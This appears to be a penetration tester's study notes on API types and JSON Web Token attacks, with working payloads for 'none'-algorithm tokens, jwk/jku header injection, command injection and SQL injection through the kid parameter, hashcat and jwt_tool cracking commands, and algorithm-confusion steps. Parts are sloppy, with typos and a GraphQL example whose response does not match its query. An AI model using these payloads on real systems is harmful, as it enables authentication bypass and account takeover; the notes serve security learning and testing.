---
cover: https://apps.apple.com/us/app/json-web-token/id6502089325
coverY: 0
---

# APIs &  JWT attacks

## RESTful  API

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

* common&#x20;
* Use JSON

```markup
{{URL}}/Param/Value

#example
{{URL}}/users/?id=1
{{URL}}/users/id/1
```

Example in Real-world

<pre class="language-bash"><code class="lang-bash"><strong>https://sectest.com/channels/2148/widgets/235 => POT req
</strong>https://sectest.com/?channels=2148&#x26;widgets=235 
</code></pre>

## GraphQl

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

* New
* Uses a custom query
* Single endpoint control all API

<pre class="language-sql"><code class="lang-sql">#Request
/graphiql?query=HERE
<strong>{
</strong>    users{
    name
    id
    }
}
#Response

{
    "users":{
        "name":"h3ckt00r",
        "id":1
    }
}
</code></pre>

can change in request to get data

<pre class="language-sql"><code class="lang-sql">Change id
#Request
/graphiql?query=HERE
{
    users(id=1){
    name
    id
    }
}
#Response

{
    "users":{
        "name":"h3ckt00r",
        "id":1
    }
}
#================================================================================
<strong>Change name 
</strong><strong>#Request
</strong>/graphiql?query=HERE
{
    users(name:"h3ckt00r"){
    name
    id
    }
}
#Response

{
    "users":{
        "name":"h3ckt00r",
        "id":1
    }
}
</code></pre>

and can change anything because can get any parameter the website and change Vale for example \
password and email&#x20;

```sql
#Request
/graphiql?query=HERE
{
    users(name:"h3ckt00r"){
    name
    id
    password
    email
    }
}
#Response

{
    "users":{
        "name":"h3ckt00r",
        "id":1
    }
}
```

query

mutation => make edited data



How to Test

```sql
{
__schema{
    types{
        name
        kind
        description
        fields{
            name
            }
        }
    }
}
```

### SOAP

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

* Less common
* Use XML

```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 <soap:Body>
  <IsValidISBN10 xmlns="http://webservices.daehosting.com/ISBN">
   <sISBN>0-19-852663-6</sISBN>
  </IsValidISBN10>
 </soap:Body>
</soap:Envelope>
```

## &#x20;JSON Web Token

{% code overflow="wrap" %}
```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
{"alg":"HS256","typ":"JWT"}

.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
{"sub":"1234567890","name":"John Doe","iat":1516239022}

.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c


HEADER. Parma. Sign
```
{% endcode %}

JWTs are composed of three parts, separated by dots:

1. **Header:** Contains metadata about the type of token and the signing algorithm used.
   * example: <mark style="color:red;">**`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`**</mark> is the encoding of <mark style="color:red;">**`{ "alg" : "HS256", "typ" : "JWT" }`**</mark>
2. **Payload:** Contains the claims. Claims are statements about an entity (typically, the user) and additional data. There are three types of claims: registered, public, and private claims.
3. **Signature:** To create the signature, the encoded header, the encoded payload, and a secret (or a public/private key pair) are used. The signature is used to verify that the sender of the JWT is who it says it is and to ensure that the message wasn't changed along the way.

* **Header**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`
* **Payload**:`eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ`
* **Signature**: `SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`

### JWS & JWE

#### JWS (JSON Web Signature):

* **Purpose:** JWS is used to digitally sign the content of a JWT to ensure its integrity and authenticity.
* **Structure:** A JWS consists of a header, a payload, and a signature. The header and payload are JSON objects encoded as base64 and concatenated with a period ('.') character. The resulting string is then signed using a key, producing the signature. The three components (header, payload, and signature) are concatenated to form the JWS.
* **Use Case:** JWS is commonly used when you want to ensure the integrity of the claims within a JWT, proving that the content has not been tampered with.

**JWE (JSON Web Encryption):**

* **Purpose:** JWE is used to encrypt the content of a JWT to provide confidentiality and secure transmission.
* **Structure:** Similar to JWS, a JWE consists of a header and a payload. However, in JWE, the payload (and optionally the header) is encrypted, providing confidentiality. The resulting encrypted payload is then signed to ensure the integrity of the encrypted content.
* **Use Case:** JWE is used when you want to secure the confidentiality of the information within a JWT especially when transmitting sensitive data

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption><p>JWT</p></figcaption></figure>

### JWT Attacks

### **Accepting arbitrary signatures**

{% hint style="danger" %}
vulnerability that can occur when a system fails to properly validate the algorithm used to sign a JSON Web Token (JWT). In a JWT, the signing algorithm is specified in the header section. If the system does not explicitly define and restrict the allowed signing algorithms, it may be vulnerable to an attacker choosing an arbitrary or malicious algorithm.
{% endhint %}

Exploitation Steps

1. **Token Creation:**
   * An attacker creates a JWT with a manipulated header that specifies a different, potentially weaker or malicious, signing algorithm.
2. **Token Submission:**
   * The attacker submits the manipulated JWT to the target system.
3. **Token Processing:**
   * The system, if not validating and restricting the allowed signing algorithms, may accept the token and attempt to verify the signature using the manipulated algorithm specified in the header.
4. **Exploitation:**
   * The attacker may exploit vulnerabilities associated with the chosen algorithm, such as known weaknesses or vulnerabilities in the cryptographic library used by the system.
5. ### **Consequences:**

* If successful, the attacker could bypass the intended security measures, potentially leading to unauthorized access, data tampering, or other security breaches.

### Accepting tokens with no signature or None alg attack

_Accepting Tokens with No Signature attack_, also known as an unsigned token attack, occurs when a system does not enforce the presence of a digital signature in JSON Web Tokens (JWTs) during the authentication or authorization process. In a standard JWT flow, the digital signature is crucial for ensuring the integrity and authenticity of the token. However, if a system mistakenly accepts unsigned tokens or fails to verify the signature, it becomes vulnerable to various security risks.

_Exploitation Steps_

1. **Token Creation:**
   * An attacker creates a JWT with the "alg" parameter set to "none" in the header, indicating that the token is unsigned.
2. **Token Submission:**
   * The attacker submits the unsigned JWT to the target system.
3. **Token Processing:**
   * The system, if not properly configured or secured, accepts the unsigned JWT without performing any signature verification.
4. **Exploitation:**
   * Since the system accepts the token as valid without signature verification, the attacker gains unauthorized access or manipulates the information contained in the token.
5. **Consequences:**
   * The consequences may include unauthorized access, data tampering, and a compromise of the integrity and authenticity of the information conveyed by the token.

{% hint style="info" %}
Even if the token is unsigned, the payload part must still be terminated with a trailing dot
{% endhint %}

Example

{% code overflow="wrap" %}
```json
{"alg":"None","typ":"JWT"}

eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.

Header without algo = none + payload + .
```
{% endcode %}

### Brute-forcing secret keys or Crack Password

Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a password, it's crucial that this secret can't be easily guessed or brute-forced by an attacker. Otherwise, they may be able to create JWTs with any header and payload values they like, then use the key to re-sign the token with a valid signature.

_Brute-forcing using hashcat_

```bash
hashcat -a 0 -m 16500 <jwt> <wordlist> 
Rule-based attack: hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
Brute force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
```

or Using John

```bash
john jwt.txt --wordlist==/usr/shere/wordlists/roukyou

```

{% embed url="https://github.com/wallarm/jwt-secrets" %}

{% embed url="https://github.com/ticarpi/jwt_tool" %}

```bash
python3 jwt_tool.py -M at \\
    -t "<https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245>" \\
    -rh "Authorization: Bearer eyJhbG...<JWT Token>"
```

#### Then, you can search the request in your proxy or dump the used JWT for that request using jwt\_ tool:

```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```

### header parameter injections

_Interesting Headers_ :

* <mark style="color:red;">**`jwk`**</mark> (JSON Web Key) - Provides an embedded JSON object representing the key.
* <mark style="color:red;">**`jku`**</mark> (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.
* <mark style="color:red;">**`kid`**</mark> (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching <mark style="color:red;">**`kid`**</mark> parameter.

#### Injecting self-signed JWTs via the jwk parameter

<mark style="color:red;">**JWK (JSON Web Key):**</mark> It's a standardized format for representing cryptographic keys as JSON objects. In the context of JWS, the JWK format can be used to represent public keys.

```json
{
"kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
"typ": "JWT",
"alg": "RS256",
"jwk": {
		"kty": "RSA",
		"e": "AQAB",
		"kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
		"n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
	}
}
```

Public Key & Private Key

* **Signature Key:**
  * The server uses its private key to create the digital signature for  the JWT&#x20;
*   **Signature verification**&#x20;

    * The recipient (server or client) uses the public key to verify the digital signature. This involves decrypting the signature with the public key and comparing it to a recalculated hash of the message. If they match, the signature is valid.

    <figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

2\. Send a request containing the jwt header to the repeater and go the the JSON Web Token tab from the attack menu embed the created <mark style="color:red;">**JWK**</mark> and change the username

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

#### **JWKS Injection (CVE-2018-0114):**

**`python3 jwt_tool.py JWT_HERE -X i`**

### Injecting self-signed JWTs via the jku parameter

Instead of directly including public keys through the jwk header parameter, certain servers enable the use of the jku (JWK Set URL) header parameter to point to a JWK Set containing the relevant key. During signature verification, the server retrieves the necessary key from the specified URL.

**A JWK Set** is a JSON object containing an array of JSON Web Keys (JWKs), allowing for centralized key management. It is commonly used in JWT-based authentication systems to provide a set of keys for signature verification.

_Example_

{% code overflow="wrap" %}
```json
{
	"keys": [
		{
			"kty": "RSA",
			"e": "AQAB",
			"kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
			"n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
		},
		{
			"kty": "RSA",
			 "e": "AQAB",
			  "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
			   "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
		}
    ]
 }
```
{% endcode %}

JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as /<mark style="color:red;">**.well-known/jwks.json**</mark>

**1. Generate Self-Signed Key:**

* Using burp jwt Editor

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

2. Get the JWK
   1. right-click on the entry for the key that you just generated, then select Copy Public Key as JWK.

```
{
	"keys": [
		{
		    "kty": "RSA",
		    "e": "AQAB",
		    "kid": "aab7415c-d598-4e98-9f37-8c77ade5fdff",
		    "n": "xJyU7aNuvyOvHirb6AS1dqSRx89R8fltvH0in0Y5AJGHVfsJ9XTjK88Kau9E6Vpdb62sB_uK13dEg4hGKj3J6gaGzH9LOPiCsPmWWLWR09ORiOrBr8U9de2_0io3et47l5yl8Nivf3CjsXNsLEFcfJi58T3AxG4BF9KAOGJFtlbtwMUawEOBiemHg1E2nLo0o12vhcnWSO60eC97ftO-mnP_y3ZWRxJnLy7A-l7HLjLFrHcbQZxY4gFEzwDIwrjCMEz7DZqn3KAMAC6Gnwq0652v5338Qs8_d2cnQ8GuiRmWegs4G2YNrIy_WonalBg-G3n70iBsw7s3lKIZOw4ySw"
		}
	]
}
```

3. **Hosting**

* Host the self-signed public key as a JSON Web Key (JWK) Set on a server or accessible location.

3. **Change**<mark style="color:red;">**`kid`**</mark> value
   * In the header of the JWT, replace the current value of the <mark style="color:red;">**`kid`**</mark> parameter with the <mark style="color:red;">**`kid`**</mark> of the JWK that you uploaded to your server.
4. **Add jku parameter**
   * Add a new <mark style="color:red;">**`jku`**</mark> parameter to the header of the JWT. Set its value to the URL of your JWK Set on the server.
   * At the bottom of the tab, click **Sign**, then select the RSA key that you generated.
   * Make sure that the **Don’t modify header** option is selected, then click **OK**. The modified token is now signed with the correct signature.

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Ruby library Net::FTP (CVE-2017-17405)

{% code overflow="wrap" %}
```bison
Net::FTP library and the application revolves around the distinction between the usage of [`File.open](http://file.open/)(...)` and `open(...)`.

- [**File.open](http://file.open/)(....):**

open(...):
In contrast, the open(...) method, if exploited by an attacker, enables the execution of commands by using the pipe symbol (|) before the command. This can lead to command injection vulnerabilities. Example:

$ irb
irb(main):001:0> File.open("|/usr/bin/uname").read()
Errno::ENOENT: No such file or directory - |/usr/bin/uname
  from (irb):1:in `initialize'
  from (irb):1:in `open'
  from (irb):1
  from /usr/bin/irb:12:in `<main>'
irb(main):002:0> open("|/usr/bin/uname").read()
=> "Darwin\n"
```
{% endcode %}

Exploit

```json
{
    "typ": "JWT",
    "alg": "HS256",
    "kid": "|sleep 10"
}
```

### SQLi In kid Parameter

**Scenario:**

* The application uses the "kid" parameter to retrieve a secret key from a database for signing JWTs.
* An SQL injection vulnerability in the "kid" parameter allows an attacker to manipulate the SQL query and retrieve a known secret.

**Example:**

* Suppose the JWT header is as follows:

```json
{
    "typ": "JWT",
    "alg": "HS256",
    "kid": "key1"
}
```

**Normal SQL Query:**

```sql
SELECT secret FROM jwt_secrets WHERE key = 'key1';
```

**Exploited SQL Injection:**

```sql
SELECT secret FROM jwt_secrets WHERE key = 'any_key_does_not_exist' UNION SELECT 'my_secret';
```

**Exploitation Steps:**

1. The attacker identifies an SQL injection vulnerability in the "kid" parameter.
2. Instead of a legitimate "kid" value, the attacker injects malicious input

```json
{
    "typ": "JWT",
    "alg": "HS256",
    "kid": "key1' UNION SELECT 'my_secret"
}

{
    "user": "admin"
}
```

1. The attacker sign a new JWT with the same value as the secret in the SQL query
2. When the attacker sends the tempered JWT to the server the SQL query will result <mark style="color:red;">**`kid=secret_123`**</mark> as `zzz` is not exist
3. As the kid value matches the key that the token signed with the attacker will be able to send a valid token

### Symmetric vs asymmetric algorithms 

| Algorithm        | Key used to sign | Key used to verify |
| ---------------- | ---------------- | ------------------ |
| Asymmetric (RSA) | Private key      | Public key         |
| Symmetric (HMAC) | Shared secret    | Shared secret      |

JWTs can be signed using a range of different algorithms. Some of these, such as <mark style="color:red;">**HS256 (HMAC + SHA-256**</mark>) use a "**symmetric**" key. This means that the server uses a single key to both sign and verify the token. This needs to be kept secret, just like a password.

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Other algorithms, such as <mark style="color:red;">**RS256 (RSA + SHA-256)**</mark> use an "**asymmetric**" key pair. This consists of a private key, which the server uses to sign the token, and a mathematically related public key that can be used to verify the signature.

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

As the names suggest, the private key must be kept secret, but the public key is often shared so that anybody can verify the signature of tokens issued by the server.

**'none' Algorithm (CVE-2015-9235):**

```bash
1. Turn Intercept on in burp and Login to Web App
2. Forward the request until you get JWT token
3. Switch to JSON Web Token Tab or JOSEPH which also contains bypass
4. Change "alg:" to None, none, NONE, nOnE "alg:none"
		{
		  "alg": "none",
		  "typ": "JWT"
		}
5. Change the Payload and edit the signature to empty
		Signature = ""
6. Forward the Request. Done!

OR 
python3 jwt_tool.py JWT_HERE -X a
If the page returns valid then you have a bypass - go tampering.
```

### **JWT authentication bypass via algorithm confusion**

\


**Step 1 - Obtain the server's public key:**

* Servers may expose their public keys as JSON Web Key (JWK) objects through endpoints like <mark style="color:red;">**`/jwks.jso`**</mark>`n` or <mark style="color:red;">**`/.well-known/jwks.json`**</mark>.

{% code overflow="wrap" %}
```bash
{"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"73074f03-e068-4cee-b65d-c20462bb63fe","alg":"RS256","n":"z93g-LLs1HOfCA7pBj5eu43Kt-R4gVfJ2Wa8oCr8H31j7YUajf0Ypum6dSLER9Lw3YBzY6XjRKhGh_2T0bZjhqumi4gvwJmVMUWlbhcnH6Qvei9sqlC6isreOyewjwNvAal-taaq6eL7_jono4amdXQJ1LjYVnrhqRjkGtIF6Rg1wy361DjQact9dqal-dHzuImO0HcvWJK9-RsuYv5hrkKglysk948df-ylDqC4LSDVGut0DUPUJxXwWGFBhHlqJFEVPsC3yMUQ1shQQN9fzQ-8jFgFAzidthi53xykJS7J73y34iJ-ryYzce1uzl_SUnEl_b9f9GrTl4bF6g8hJw"}]}
```
{% endcode %}

* Extract the public key from a pair of existing JWTs if not publicly exposed.

**Step 2 - Convert the public key to a suitable format:**

* The server's public key may be in JWK format, but for the attack to work, it needs to match the server's local copy.
* Assume the key needs to be in X.509 PEM format and convert a JWK to PEM using the JWT Editor extension in Burp:
  * In Burp's JWT Editor Keys tab, click New RSA Key, paste the JWK, select the PEM radio button, and copy the resulting PEM key.
  * Base64-encode the PEM in the Decoder tab.
  * Go back to JWT Editor Keys, click New Symmetric Key, generate a new key in JWK format, and replace the value for the k parameter with the Base64-encoded PEM key.

**Step 3 - Modify your JWT:**

* Once the public key is in the right format, modify the JWT as desired, ensuring the alg header is set to HS256.

**Step 4 - Sign the JWT using the public key:**

* Sign the token using the HS256 algorithm with the RSA public key as the secret.
